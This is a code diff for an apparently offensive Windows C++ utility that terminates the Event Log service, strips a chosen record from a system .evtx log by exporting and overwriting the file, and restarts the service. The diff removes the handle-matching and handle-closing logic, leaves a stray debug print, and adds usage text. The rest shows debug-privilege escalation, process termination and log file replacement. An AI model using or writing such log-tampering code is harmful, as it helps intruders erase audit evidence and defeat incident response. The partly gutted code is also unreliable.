@@ -138,6 +138,7 @@ BOOL IsBlockingHandle(HANDLE handle)
 	return TRUE;
 }
 
+
 DWORD  getpid2()
 {
 	DWORD PID = 0;
@@ -264,7 +265,7 @@ BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
 			CloseHandle(dupHandle);
 			continue;
 		}
-
+		
 		if (handle.ProcessId == ErrorPID)
 		{
 			free(objectTypeInfo);
@@ -272,7 +273,7 @@ BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
 			CloseHandle(dupHandle);
 			continue;
 		}
-
+		
 		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
 		{
 			printf("[!]Could not open PID %d!\n", handle.ProcessId);
@@ -283,7 +284,7 @@ BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
 			CloseHandle(processHandle);
 			continue;
 		}
-
+		
 		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
 		{
 			//			printf("[%#x] Error!\n", handle.Handle);
@@ -293,6 +294,7 @@ BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
 			CloseHandle(processHandle);
 			continue;
 		}
+		
 		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
 		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
 		{
@@ -303,68 +305,21 @@ BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
 			CloseHandle(processHandle);
 			continue;
 		}
+		
 		objectNameInfo = malloc(0x1000);
-
+		
 		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
 		{
+			printf("3");
 			free(objectTypeInfo);
 			free(objectNameInfo);
 			CloseHandle(dupHandle);
 			CloseHandle(processHandle);
 			continue;
 		}
-
-		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength)))
-		{
-
-			objectNameInfo = realloc(objectNameInfo, returnLength);
-			if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, returnLength, NULL)))
-			{
-				//				printf("[%#x] %.*S: (could not get name)\n", handle.Handle, objectTypeInfo->Name.Length / 2, objectTypeInfo->Name.Buffer);
-				free(objectTypeInfo);
-				free(objectNameInfo);
-				CloseHandle(dupHandle);
-				CloseHandle(processHandle);
-				continue;
-			}
-		}
-		objectName = *(PUNICODE_STRING)objectNameInfo;
-		if (objectName.Length)
-		{
-			_wcslwr_s(objectName.Buffer, wcslen(objectName.Buffer) + 1);
-			if (wcsstr(objectName.Buffer, buf1) != 0)
-			{
-				printf("[+]HandleName:%.*S\n", objectName.Length / 2, objectName.Buffer);
-				printf("[+]Pid:%d\n", handle.ProcessId);
-				printf("[+]Handle:%#x\n", handle.Handle);
-				printf("[+]Type:%#x\n", handle.ObjectTypeNumber);
-				printf("[+]ObjectAddress:0x%p\n", handle.Object);
-				printf("[+]GrantedAccess:%#x\n", handle.GrantedAccess);
-
-			
-					printf("[+]Try to close the file's handle... ");
-
-					if (DuplicateHandle(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, DUPLICATE_CLOSE_SOURCE))
-					{
-						CloseHandle(dupHandle);
-						printf("done.\n");
-					}
-					else
-						printf("false.\n");
-
-			}
-			else
-			{
-				//			printf("[%#x] %.*S: (unnamed)\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer);
-			}
-			free(objectTypeInfo);
-			free(objectNameInfo);
-			CloseHandle(dupHandle);
-			CloseHandle(processHandle);
-		}
+		CloseHandle(dupHandle);
 	}
 	free(handleInfo);
-
 	return TRUE;
 }
 
@@ -372,7 +327,8 @@ int _tmain(int argc, _TCHAR *argv[])
 {
 	if (argc != 3)
 	{
-		printf("Kill the eventlog service's process and delete one eventlog record,then restart the Eventlog Service.\n\n");
+		printf("Kill the eventlog service's process and delete one eventlog record,then restart the Eventlog Service.\n");
+		printf("Delete the eventlog by using WinAPI EvtExportLog.\n\n");
 		printf("Usage:\n");
 		printf("%s <Eventlog file name> <EventRecordID>\n", argv[0]);
 		printf("eg:\n");
@@ -386,6 +342,7 @@ int _tmain(int argc, _TCHAR *argv[])
 		printf("[!]Get EventLog's PID error\n");
 		return -1;
 	}
+	BOOL bResult;
 	LPWSTR lpPath = new WCHAR[MAX_PATH];
 	ZeroMemory(lpPath, MAX_PATH);
 	GetSystemDirectory(lpPath, MAX_PATH);
@@ -393,6 +350,7 @@ int _tmain(int argc, _TCHAR *argv[])
 	lstrcat(lpPath, argv[1]);
 	printf("[+]Path:%ws\n", lpPath);
 
+	printf("[+]Delete the eventlog by using WinAPI EvtExportLog\n");
 	printf("1.Try to EnableDebugPrivilege... ");
 	if (!EnableDebugPrivilege(TRUE))
 	{
@@ -406,6 +364,7 @@ int _tmain(int argc, _TCHAR *argv[])
 		printf("Done\n");
 	else
 	{
+
 		printf("[!]Maybe you should delete temp.evtx first,then run me\n");
 		return -1;
 	}
@@ -420,7 +379,7 @@ int _tmain(int argc, _TCHAR *argv[])
 	printf("Done\n");
 
 	printf("4.Try to TerminateProcess... ");
-	BOOL bResult = TerminateProcess(processHandle, 0);
+	bResult = TerminateProcess(processHandle, 0);
 	if (bResult == NULL)
 	{
 		printf("Error\n");
@@ -437,7 +396,7 @@ int _tmain(int argc, _TCHAR *argv[])
 		return -1;
 	}
 	printf("Done\n");
-
+	
 	printf("6.Try to replace evtx file... ");
 	if ((CopyFile(L"Temp.evtx", lpPath, FALSE)) == NULL)
 		printf("\n[!]Error,%d\n", GetLastError());
